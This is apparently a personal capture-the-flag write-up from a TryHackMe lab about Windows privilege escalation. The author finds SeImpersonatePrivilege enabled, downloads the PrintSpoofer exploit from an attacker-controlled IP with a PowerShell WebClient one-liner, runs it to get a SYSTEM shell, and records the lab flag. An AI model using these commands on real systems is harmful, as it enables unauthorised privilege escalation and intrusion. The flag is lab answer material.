running
`whomai /priv`

![[Pasted image 20210529134325.png]]

and we have  a exploitable service

`SeImpersonatePrivilege        Impersonate a client after authentication Enabled `


on looking there a exploit for this (without metasploit )

https://github.com/itm4n/PrintSpoofer

transfer the binary PrintSpoofer64

`powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/PrintSpoofer64.exe','C:\Users\bob\Desktop\PrintSpoofer64.exe`

and run `PrintSpoofer64.exe -i -c powershell`  and we have root

![[Pasted image 20210529135345.png]]


root == THM{1fk5kf469devly1gl320zafgl345pv}
